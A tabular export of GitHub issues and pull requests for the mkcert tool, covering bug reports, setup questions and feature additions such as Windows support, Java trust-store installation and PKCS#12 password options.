FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/58,350738409,MDExOlB1bGxSZXF1ZXN0MjA4NTEwMTM5,58,Added -password flag to allow specifying  of PKCS#12 password,1029699,closed,FALSE,NA,NA,5,2018-08-15T09:08:22Z,2019-01-06T22:46:30Z,2019-01-06T22:42:31Z,NONE,NA,"Hi,

I didn't like that the PKCS#12 support didn't allow you to specify the password, so I added a flag to pass in your own. I also updated the usage text as it was not immediately obvious _what_ the default password even was.

I've never touched Go before, so apologies if I've made a mistake. Feel free to feedback on anything that should have been done differently.

I've signed the CLA as well.",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/58/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/58/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/58/events,https://github.com/FiloSottile/mkcert/pull/58,https://api.github.com/repos/FiloSottile/mkcert/pulls/58
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/57,350598450,MDExOlB1bGxSZXF1ZXN0MjA4NDExMDM4,57,Support installing to system trust store for Arch-based distros,36654355,closed,FALSE,NA,NA,3,2018-08-14T21:08:18Z,2018-08-19T22:36:14Z,2018-08-19T22:36:14Z,CONTRIBUTOR,NA,"Arch ca-certificates reference: https://www.archlinux.org/news/ca-certificates-update/

Working for me on Manjaro Linux 17.1.11.",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/57/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/57/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/57/events,https://github.com/FiloSottile/mkcert/pull/57,https://api.github.com/repos/FiloSottile/mkcert/pulls/57
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/56,350306634,MDU6SXNzdWUzNTAzMDY2MzQ=,56,Apache configuration on macOS,11408027,closed,FALSE,NA,NA,17,2018-08-14T07:12:06Z,2019-05-16T02:38:46Z,2018-09-03T14:15:37Z,NONE,NA,"After following all steps in the README for macOS and generating certificates for `localhost+7` in `~/Sites/_certificates/`, I wonder if there’s some special configuration settings for macOS’ built in Apache (with vhosts).

Would be happy if anyone using `mkcert` on macOS could share their experiences on how to get `mkcert` up and running.",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/56/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/56/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/56/events,https://github.com/FiloSottile/mkcert/issues/56,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/55,350304491,MDExOlB1bGxSZXF1ZXN0MjA4MTg2NzMy,55, Support for CSRs (Certificate Signing Requests),1571820,closed,FALSE,NA,NA,5,2018-08-14T07:03:50Z,2019-02-02T23:56:26Z,2019-02-02T23:54:09Z,NONE,NA,"This pull request adds another flag to mkcert: use `mkcert -csr some.csr` to sign a CSR using the current CA.

I can make changes, if you don't like the code. Let me know.",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/55/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/55/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/55/events,https://github.com/FiloSottile/mkcert/pull/55,https://api.github.com/repos/FiloSottile/mkcert/pulls/55
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/54,350228622,MDExOlB1bGxSZXF1ZXN0MjA4MTMxMDk0,54,java: fix keytool path detection on windows and JRE/JDK,120951,closed,FALSE,NA,NA,2,2018-08-13T23:26:08Z,2018-08-19T22:56:29Z,2018-08-19T22:56:29Z,CONTRIBUTOR,NA,Fixes: https://github.com/FiloSottile/mkcert/issues/53,NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/54/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/54/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/54/events,https://github.com/FiloSottile/mkcert/pull/54,https://api.github.com/repos/FiloSottile/mkcert/pulls/54
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/53,349951298,MDU6SXNzdWUzNDk5NTEyOTg=,53,Executable not found in path,98056,closed,FALSE,NA,NA,25,2018-08-13T09:22:57Z,2018-10-27T09:10:27Z,2018-08-19T22:56:28Z,NONE,NA,"I tried running `mkcert` version 1.1.0 in windows. I got the following error.

> `$ mkcert-v1.1.0-windows-amd64.exe example.org`
> `Using the local CA at ""C:\Users\XXXXX\AppData\Local\mkcert""`
> `ERROR: failed to execute ""keytool -list"": exec: """": executable file not found in %PATH%`",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/53/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/53/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/53/events,https://github.com/FiloSottile/mkcert/issues/53,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/52,349868873,MDU6SXNzdWUzNDk4Njg4NzM=,52,Multiple CAs overwrite each other on Linux,1225294,closed,FALSE,NA,NA,0,2018-08-13T02:27:21Z,2018-08-19T23:08:15Z,2018-08-19T23:08:15Z,OWNER,NA,The `SystemTrustFilename` should depend on the `caUniqueName`.,NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/52/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/52/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/52/events,https://github.com/FiloSottile/mkcert/issues/52,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/51,348937524,MDU6SXNzdWUzNDg5Mzc1MjQ=,51,Installing in Firefox failed... The local CA is now installed in the Firefox trust store...,972141,closed,FALSE,NA,NA,2,2018-08-09T00:30:24Z,2019-01-07T00:08:55Z,2019-01-07T00:08:55Z,NONE,NA,"I use Firefox Developer Edition. I also install apps in `$HOME/Applications`. I've symlinked `$HOME/Applications/Firefox Developer Edition.app` to `/Applications/Firefox.app` in an effort to possibly solve this mkcert issue. Perhaps I've solved it given the output I see:

```
→ mkcert -install
Using the local CA at ""/Users/[user]/Library/Application Support/mkcert"" ✨
Installing in Firefox failed. Please report the issue with details about your environment at https://github.com/FiloSottile/mkcert/issues/new 👎
Note that if you never started Firefox, you need to do that at least once.
The local CA is now installed in the Firefox trust store (requires browser restart)! 🦊

```

But I'm a bit confused about what's actually happened. ""Using local CA... Firefox installation failed... local CA is now installed in Firefox...""

That said, I _have_ made good use of mkcert: system keychain trusts the root, certs are created for local vhosts, paths to ipv4 & ipv6 pem files are correctly set in Nginx conf files, browsers are validating the certs... but perhaps I'm taking the long way around it.

Any clarification would be greatly appreciated.",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/51/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/51/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/51/events,https://github.com/FiloSottile/mkcert/issues/51,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/50,347866426,MDU6SXNzdWUzNDc4NjY0MjY=,50,"Enter Password or Pin for ""NSS Certificate DB""",20154956,open,FALSE,NA,NA,8,2018-08-06T10:26:16Z,2019-01-07T23:06:51Z,NA,NONE,NA,"Mby it's worth to give users who have a firefox master password a hint that they should enter this when they see ""Enter Password or Pin for ""NSS Certificate DB""""",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/50/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/50/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/50/events,https://github.com/FiloSottile/mkcert/issues/50,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/49,347735343,MDU6SXNzdWUzNDc3MzUzNDM=,49,Not working with python requests.,276038,closed,FALSE,NA,NA,5,2018-08-05T22:09:17Z,2018-08-06T01:08:42Z,2018-08-06T00:39:41Z,NONE,NA,"Currently have a local app running on localhost. (running OSX)

Created certificates with 

```
mkcert -install
mkcert localhost
```
and also did `brew install nss` and reran install to fix firefox.

On node, this works fine like so, and I'm able to load `https://localhost`:

```
const privateKey = fs.readFileSync('./certs/localhost-key.pem', 'utf8');
const certificate = fs.readFileSync('./certs/localhost.pem', 'utf8');
const credentials = { key: privateKey, cert: certificate };
const app = express();
const httpsServer = https.createServer(credentials, app);
```

However, I have a separate python script that I want to be able to access my local server.

This works fine and I'm able to see the proper JSON response:

```
def getUrlsToScrape():
  r = requests.get('https://localhost:1979/companies/urls', verify=False)
  return r.json()
```

However, I'd like to remove my warning so I tried referencing my cert and key files like below:

```
def getUrlsToScrape():
  r = requests.get('https://localhost:1979/companies/urls', cert=(os.path.join(dirname, '../../certs/localhost.pem'), os.path.join(dirname, '../../certs/localhost-key.pem')))
  return r.json()
```

but unfortunately I get the following error:

```
Traceback (most recent call last):
  File ""/usr/local/lib/python3.6/site-packages/urllib3/contrib/pyopenssl.py"", line 441, in wrap_socket
    cnx.do_handshake()
  File ""/usr/local/lib/python3.6/site-packages/OpenSSL/SSL.py"", line 1907, in do_handshake
    self._raise_ssl_error(self._ssl, result)
  File ""/usr/local/lib/python3.6/site-packages/OpenSSL/SSL.py"", line 1639, in _raise_ssl_error
    _raise_current_error()
  File ""/usr/local/lib/python3.6/site-packages/OpenSSL/_util.py"", line 54, in exception_from_error_queue
    raise exception_type(errors)
OpenSSL.SSL.Error: [('SSL routines', 'tls_process_server_certificate', 'certificate verify failed')]

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File ""/usr/local/lib/python3.6/site-packages/urllib3/connectionpool.py"", line 601, in urlopen
    chunked=chunked)
  File ""/usr/local/lib/python3.6/site-packages/urllib3/connectionpool.py"", line 346, in _make_request
    self._validate_conn(conn)
  File ""/usr/local/lib/python3.6/site-packages/urllib3/connectionpool.py"", line 850, in _validate_conn
    conn.connect()
  File ""/usr/local/lib/python3.6/site-packages/urllib3/connection.py"", line 326, in connect
    ssl_context=context)
  File ""/usr/local/lib/python3.6/site-packages/urllib3/util/ssl_.py"", line 329, in ssl_wrap_socket
    return context.wrap_socket(sock, server_hostname=server_hostname)
  File ""/usr/local/lib/python3.6/site-packages/urllib3/contrib/pyopenssl.py"", line 448, in wrap_socket
    raise ssl.SSLError('bad handshake: %r' % e)
ssl.SSLError: (""bad handshake: Error([('SSL routines', 'tls_process_server_certificate', 'certificate verify failed')],)"",)

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File ""/usr/local/lib/python3.6/site-packages/requests/adapters.py"", line 440, in send
    timeout=timeout
  File ""/usr/local/lib/python3.6/site-packages/urllib3/connectionpool.py"", line 639, in urlopen
    _stacktrace=sys.exc_info()[2])
  File ""/usr/local/lib/python3.6/site-packages/urllib3/util/retry.py"", line 388, in increment
    raise MaxRetryError(_pool, url, error or ResponseError(cause))
urllib3.exceptions.MaxRetryError: HTTPSConnectionPool(host='localhost', port=1979): Max retries exceeded with url: /companies/urls (Caused by SSLError(SSLError(""bad handshake: Error([('SSL routines', 'tls_process_server_certificate', 'certificate verify
failed')],)"",),))

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File ""src/scripts/li_scrape.py"", line 56, in <module>
    urlsToScrape = getUrlsToScrape()
  File ""src/scripts/li_scrape.py"", line 28, in getUrlsToScrape
    os.path.join(dirname, '../../certs/localhost-key.pem')))
  File ""/usr/local/lib/python3.6/site-packages/requests/api.py"", line 72, in get
    return request('get', url, params=params, **kwargs)
  File ""/usr/local/lib/python3.6/site-packages/requests/api.py"", line 58, in request
    return session.request(method=method, url=url, **kwargs)
  File ""/usr/local/lib/python3.6/site-packages/requests/sessions.py"", line 508, in request
    resp = self.send(prep, **send_kwargs)
  File ""/usr/local/lib/python3.6/site-packages/requests/sessions.py"", line 618, in send
    r = adapter.send(request, **kwargs)
  File ""/usr/local/lib/python3.6/site-packages/requests/adapters.py"", line 506, in send
    raise SSLError(e, request=request)
requests.exceptions.SSLError: HTTPSConnectionPool(host='localhost', port=1979): Max retries exceeded with url: /companies/urls (Caused by SSLError(SSLError(""bad handshake: Error([('SSL routines', 'tls_process_server_certificate', 'certificate verify failed')],)"",),))
```

I am using the requests library, using instructions here - http://docs.python-requests.org/en/master/user/advanced/?highlight=ssl#client-side-certificates",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/49/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/49/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/49/events,https://github.com/FiloSottile/mkcert/issues/49,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/48,342462747,MDExOlB1bGxSZXF1ZXN0MjAyMzU3Mjgw,48,detect firefox developer edition,178512,closed,FALSE,NA,NA,3,2018-07-18T19:34:54Z,2018-08-31T17:26:34Z,2018-08-13T01:12:42Z,NONE,NA,"I am currently using [Firefox Developer Edition](https://www.mozilla.org/es-AR/firefox/developer/) (aka Quantum) in mac, and the path for the application is `/Applications/FirefoxDeveloperEdition.app` instead of just `/Applications/Firefox.app`.

So, here is my small contribution. I am new to GO so let me know if there is something I could do better. 

Thank you for this awesome project",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/48/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/48/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/48/events,https://github.com/FiloSottile/mkcert/pull/48,https://api.github.com/repos/FiloSottile/mkcert/pulls/48
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/47,340479120,MDU6SXNzdWUzNDA0NzkxMjA=,47,"Installed root certificate is not listed in ""Certificate Trust Settings"" due to iOS bug",9743157,closed,FALSE,NA,NA,13,2018-07-12T03:45:33Z,2020-01-03T22:42:35Z,2018-07-30T01:47:48Z,NONE,NA,,NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/47/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/47/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/47/events,https://github.com/FiloSottile/mkcert/issues/47,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/46,340430393,MDExOlB1bGxSZXF1ZXN0MjAwODQ0ODUx,46,Add Windows Support,206396,closed,FALSE,NA,NA,12,2018-07-11T22:40:44Z,2018-10-30T08:55:29Z,2018-08-13T01:33:57Z,CONTRIBUTOR,NA,"This is to address issue #42. This uses the win32 crypt API which is what Go uses elsewhere when interfacing with the OS cert store. Also, though there is a ""certutil.exe"" in Windows, it's not the NSS one and therefore while I reference the FF paths, I left `hasCertutil` as false for this OS in `cert.go`.

I took care to make the smallest, self-contained changes I could here for minimal Windows support. However as I mention in #45, this code could benefit from a lot of refactoring and ""library-ification"". I don't like panicking on error, returning bools, hardcoding CA org name, etc.",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/46/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/46/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/46/events,https://github.com/FiloSottile/mkcert/pull/46,https://api.github.com/repos/FiloSottile/mkcert/pulls/46
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/45,340395097,MDU6SXNzdWUzNDAzOTUwOTc=,45,Expose a library API,206396,open,FALSE,NA,NA,24,2018-07-11T20:33:49Z,2019-08-15T19:18:12Z,NA,CONTRIBUTOR,NA,"This is not usable as a library dependency for others via `go get`. Can keep the CLI iface the same, just pull the code into a package and expose things with reasonable names. Everything that can be done via the CLI should be doable programmatically (of course, the CLI code just invokes the lib code). I'd send a PR to do this myself, but I figure such a large refactor (as in size, not effort) should be done by the maintainer.

(also, during the refactoring, fix things like exposed internal variables, use of bool returns instead of error, etc)",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/45/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/45/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/45/events,https://github.com/FiloSottile/mkcert/issues/45,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/44,340086729,MDU6SXNzdWUzNDAwODY3Mjk=,44,mitm??,5529450,closed,FALSE,NA,NA,1,2018-07-11T04:21:47Z,2018-07-12T17:56:13Z,2018-07-12T17:56:13Z,NONE,NA,Does this certificate work for mitm ssl capture?,NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/44/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/44/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/44/events,https://github.com/FiloSottile/mkcert/issues/44,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/43,339231199,MDU6SXNzdWUzMzkyMzExOTk=,43,Assistance in building mkcert v1.0.0,33538075,closed,FALSE,NA,NA,7,2018-07-08T14:42:10Z,2018-07-12T17:54:53Z,2018-07-08T17:37:34Z,NONE,NA,"Hello FiloSottile,

I'm trying to install mkcert on Ubuntu 18.04.  I have already  installed libnss3-tools and downloaded the mkcert tarball

apt install libnss3-tools

wget https://github.com/FiloSottile/mkcert/archive/v1.0.0.tar.gz

I'm not sure how to proceed from there. Kindly assist me. Thank you.
",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/43/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/43/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/43/events,https://github.com/FiloSottile/mkcert/issues/43,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/42,339181051,MDU6SXNzdWUzMzkxODEwNTE=,42,Windows Support,4735,closed,FALSE,NA,NA,7,2018-07-07T22:55:18Z,2018-08-13T01:33:58Z,2018-08-13T01:33:58Z,NONE,NA,"I know it's mentioned in the [README](https://github.com/FiloSottile/mkcert#installation) that this support is coming soon, but I'd like to correlate it to an issue that can be tracked. :)",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/42/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/42/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/42/events,https://github.com/FiloSottile/mkcert/issues/42,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/41,339117516,MDU6SXNzdWUzMzkxMTc1MTY=,41,Cert not being reflected on localhost,8945824,closed,FALSE,NA,NA,7,2018-07-07T04:58:11Z,2020-01-20T02:03:09Z,2018-07-07T05:09:24Z,NONE,NA,"`mkcert example.com '*.example.org' myapp.dev localhost 127.0.0.1 ::1`  creates the certificate and chain at `/Users/WARL0CK/Library/Application Support/mkcert` successfully.

`nginx` running at `localhost:80` doesn't reflect `https` on any browser, even after multiple cert builds and server restarts.

Am running this on `macOS High Sierra Version 10.13.5`.
",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/41/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/41/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/41/events,https://github.com/FiloSottile/mkcert/issues/41,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/40,339095137,MDExOlB1bGxSZXF1ZXN0MTk5ODY1NTcw,40,Use $XDG_DATA_HOME on macOS if it is set.,248078,closed,FALSE,NA,NA,3,2018-07-06T23:19:32Z,2018-07-07T00:19:15Z,2018-07-07T00:02:50Z,CONTRIBUTOR,NA,"I was a little surprised to see `mkcert` use `~/Library/Application Support` instead of `$XDG_DATA_HOME` until I looked at the code and see it was intentional choice.

I personally think it would be good to follow the  XDG spec fully and default to `~/.local/share` on macOS – rather than introducing custom behaviour – but it's ultimately up to you.

This PR offers a compromise, using `$XDG_DATA_HOME` if set, if you'd be okay with that. :-)
(I explicitly set XDG config vars in my shell, in order to try to get as many programs to use the same data storage structure as possible.)",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/40/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/40/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/40/events,https://github.com/FiloSottile/mkcert/pull/40,https://api.github.com/repos/FiloSottile/mkcert/pulls/40
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/39,339093412,MDU6SXNzdWUzMzkwOTM0MTI=,39,Touch Bar and Keychain support,248078,open,FALSE,NA,NA,6,2018-07-06T23:06:16Z,2020-06-18T23:24:18Z,NA,CONTRIBUTOR,NA,"Since name-constrained certs don't work everywhere, leaving the signing key lying around still exposes you to risk of having all of your secure traffic intercepted.

My first thought was that it would be nice to be able to keep the key on a Yubikey, but putting it in the macOS keychain under password/Touch ID protection (or something similar like GNOME keyring) would also be a reasonable intermediate option.

Do you think that would fit in the scope of this project, or should it perhaps be something separate?
(Is there already a PKCS#11 abstraction in Golang that would support this functionality?)",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/39/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/39/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/39/events,https://github.com/FiloSottile/mkcert/issues/39,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/38,339075300,MDExOlB1bGxSZXF1ZXN0MTk5ODUwNDA2,38,support install into java cacerts file,120951,closed,FALSE,NA,NA,6,2018-07-06T21:23:30Z,2018-07-30T14:28:54Z,2018-07-30T02:22:28Z,CONTRIBUTOR,NA,"This works for me locally on a Mac with Java 8 and 9. I'm going to test out a bit on linux and newer Java versions. 

```
$ ./bin/mkcert -install
Using the local CA at ""/Users/adam/Library/Application Support/mkcert"" ✨
The local CA is now installed in the system trust store! ⚡️
The local CA is now installed in the Firefox trust store (requires browser restart)! 🦊
The local CA is now installed in Java's trust store ☕️

$ keytool -list -keystore $JAVA_HOME/jre/lib/security/cacerts -storepass changeit | grep -i mkcert
mkcert development ca 215883752978067404179277978616948247614, Jul 6, 2018, trustedCertEntry, 
```",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/38/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/38/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/38/events,https://github.com/FiloSottile/mkcert/pull/38,https://api.github.com/repos/FiloSottile/mkcert/pulls/38
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/36,338514749,MDExOlB1bGxSZXF1ZXN0MTk5NDI0ODgw,36,Dockerfile for build and release,2234775,closed,FALSE,NA,NA,1,2018-07-05T10:23:21Z,2018-07-06T22:58:30Z,2018-07-06T22:58:29Z,NONE,NA,"Created a Multi-Stage Dockerfile to build go binary from sources and create a mkcert Docker image
",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/36/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/36/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/36/events,https://github.com/FiloSottile/mkcert/pull/36,https://api.github.com/repos/FiloSottile/mkcert/pulls/36
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/35,338414506,MDU6SXNzdWUzMzg0MTQ1MDY=,35,ERROR,10565361,closed,FALSE,NA,NA,0,2018-07-05T03:18:34Z,2018-07-05T03:19:26Z,2018-07-05T03:19:26Z,NONE,NA,"ERROR
",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/35/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/35/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/35/events,https://github.com/FiloSottile/mkcert/issues/35,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/34,338372474,MDExOlB1bGxSZXF1ZXN0MTk5MzIxNTgw,34,add PKCS#12 generation with password changeit,46711,closed,FALSE,NA,NA,3,2018-07-04T20:45:45Z,2018-08-13T04:37:18Z,2018-08-13T04:37:18Z,CONTRIBUTOR,NA,the default password for PKCS is changeit,NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/34/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/34/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/34/events,https://github.com/FiloSottile/mkcert/pull/34,https://api.github.com/repos/FiloSottile/mkcert/pulls/34
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/33,338322093,MDExOlB1bGxSZXF1ZXN0MTk5Mjg1MDI3,33,truststore: check if profile is a directory before joining cert*.db,11139925,closed,FALSE,NA,NA,2,2018-07-04T15:46:52Z,2018-07-09T23:09:21Z,2018-07-04T16:59:34Z,CONTRIBUTOR,NA,"This should fix FiloSottile/mkcert#12, because the `FirefoxProfile` glob also matches files like `profile.ini`.",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/33/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/33/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/33/events,https://github.com/FiloSottile/mkcert/pull/33,https://api.github.com/repos/FiloSottile/mkcert/pulls/33
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/32,338255029,MDExOlB1bGxSZXF1ZXN0MTk5MjMzNDIy,32,readme: update homebrew install,26216252,closed,FALSE,NA,NA,1,2018-07-04T12:23:43Z,2018-07-04T23:01:43Z,2018-07-04T16:49:39Z,CONTRIBUTOR,NA,This was added to Homebrew in https://github.com/Homebrew/homebrew-core/pull/29733,NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/32/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/32/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/32/events,https://github.com/FiloSottile/mkcert/pull/32,https://api.github.com/repos/FiloSottile/mkcert/pulls/32
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/31,337942274,MDU6SXNzdWUzMzc5NDIyNzQ=,31,Allow a custom comment in any generated names,53131,closed,FALSE,NA,NA,2,2018-07-03T15:10:57Z,2018-07-03T23:53:16Z,2018-07-03T23:53:16Z,NONE,NA,"I understand wanting to keep `mkcert development CA` in the name so no shenanigans like `Some Big Name Legit Authority CA` but it would be useful to add a _comment_ similar to the process of setting up a GPG key.  It asks for your Name, Email, and an Optional comment.  In GPG world it's so you could have `John Doe (Work Correspondence Only) <worker@example.com>`.

For here it would be to differentiate my `mkcert development CA` from someone else's `mkcert development CA`.  Yes, the serial numbers will be different but at glance see a certificate was issued by (don't think you can have parenthesis in a subject name) `mkcert development CA  - vrillusions dev work` or similar would be useful.

User experience could be something similar to GPG process where the `mkcert development CA` is hardcoded then prompt for an optional comment.",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/31/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/31/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/31/events,https://github.com/FiloSottile/mkcert/issues/31,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/30,337888818,MDU6SXNzdWUzMzc4ODg4MTg=,30,Wildcard on second-level domain does not work,898057,closed,FALSE,NA,NA,7,2018-07-03T13:00:28Z,2019-11-14T14:03:04Z,2018-07-03T21:17:16Z,NONE,NA,"I have setup mkcert, and in apache config successfully created two sites: `hostname.local` and `somename.test`. These two work, but then I also tried to setup a wildcard `*.test` system where other folders in the `~/Sites` are ""converted"" to `.test` domains:

```
<VirtualHost *:443>
  ServerName test
  ServerAlias *.test

  VirtualDocumentRoot ""/Users/David/Sites/%-2+""

  SSLEngine on
  SSLCertificateFile ""/Users/David/ssl/_wildcard.test.pem""
  SSLCertificateKeyFile ""/Users/David/ssl/_wildcard.test-key.pem""
</VirtualHost>
```

This system in Apache works, but the certificate doesn't work:

![screen shot 2018-07-03 at 14 09 31](https://user-images.githubusercontent.com/898057/42220867-7c0e26de-7ed0-11e8-8d93-f1cd7c5e9966.png)

![screen shot 2018-07-03 at 14 09 27](https://user-images.githubusercontent.com/898057/42220885-7e3339f4-7ed0-11e8-83da-33c7e981d5fc.png)

FWIW, in Chrome the error is `
NET::ERR_CERT_COMMON_NAME_INVALID`.",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/30/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/30/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/30/events,https://github.com/FiloSottile/mkcert/issues/30,NA
